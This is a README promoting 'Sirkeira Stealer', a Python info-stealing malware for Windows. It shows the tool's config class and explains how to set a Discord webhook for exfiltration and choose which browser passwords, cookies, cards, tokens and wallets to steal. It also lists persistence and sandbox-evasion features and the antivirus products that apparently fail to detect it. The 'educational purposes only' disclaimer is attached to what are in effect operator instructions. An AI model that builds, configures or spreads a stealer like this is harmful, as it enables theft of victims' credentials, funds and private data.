
<div align="center">
  <h1> Sirkeira Stealer </h1>
</div>

> [!WARNING]
> **WARNING:** This code is provided for **EDUCATIONAL PURPOSES ONLY** to study system security. Malicious use of this software is strictly prohibited and illegal. The author is not responsible for any misuse.

# Explanation

This is a Python script that demonstrates the techniques used by "stealer" malware to extract sensitive information from a Windows system. It collects data such as browser passwords, cookies, Discord tokens, system information, and interesting files, then sends them to a Discord webhook. The code includes methods for system persistence, sandbox evasion, and task manager blocking.

**Developed by:** [**@CirqueiraDev**](https://github.com/CirqueiraDev)

## How to Install

1. Clone the repository or download the `skstealer.py` file.
``` py
  class Malware:
      def __init__(self):
          self.zip_name = f"SK_{random.randint(10000000000, 99999999999)}.zip"
          self.webhook_url = "YOUR DISCORD WEBHOOK HERE"
          self.stealer_version = "1.5.2"
          self.malware_name = "Sirkeira Stealer"
          self.malware_author = "https://t.me/CirqueiraDev"
          self.browser_infos = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
          self.session_files = ["Wallets", "Game Launchers", "Apps"]
          self.task_manager_blocked = False
```
2. Open the `skstealer.py` file and modify the configuration inside the `Malware` class:
   - Change `self.webhook_url` to your actual Discord webhook URL.
   - (Optional) Modify `self.browser_infos` to select which browser data to steal (e.g., `"passwords"`, `"cookies"`).
   - (Optional) Modify `self.session_files` to select which session files to target (e.g., `"Wallets"`, `"Game Launchers"`).

## Requirements
```bash
pip install -r requirements.txt
```

```
requests
psutil
browser-cookie3
cryptography
pywin32
pycryptodome
opencv-python
Pillow
```

# Stealer Functions
- [x] Screenshot
- [x] Webcam
- [x] System infos
- [x] Browser infos (extentions, passwords, cookies, history, downloads, cards)
- [x] Session files (Wallets, Game Launchers, Apps)
- [x] AntiVirus infos
- [x] Discord tokens
- [x] Roblox cookies
- [x] Interesting files

# Antivirus Detection Status (VirusTotal)
- [x] Avast  -  Python:Stealer-FJ [PWS]
- [x] AVG - Python:Stealer-FJ [PWS]
- [x] ESET-NOD32 - Python/PSW.Agent.DYB Trojan
- [x] Huorong - TrojanSpy.OSX.Stealer.e
- [x] Rising - Stealer.Agent/Python!1.103FE (CLASSIC)
- [ ] Kaspersky - Undetected
- [ ] BitDefender - Undetected
- [ ] Microsoft Defender - Undetected
- [ ] Malwarebytes - Undetected
- [ ] CrowdStrike Falcon - Undetected

## Total 7/63 (the code wasn’t protected)
HASH:
```
e0fb6a9dfac0e9544f1a4c39a6e89a35b16b38aae8ad674f3085d7504ee8e3ab
```

> VirusTotal detections may vary depending on heuristic analysis.

##

> [!IMPORTANT]
> **The creator is not responsible for any direct or indirect damage resulting from misuse of this material.**
> **Whatever you choose to do is entirely at `your own risk and responsibility`.**

##

### Credits:

- Owner: [**CirqueiraDev**](https://github.com/CirqueiraDev)
- For more information, contact: [Telegram](https://t.me/cirqueiradev)
- **Discord: Cirqueira**
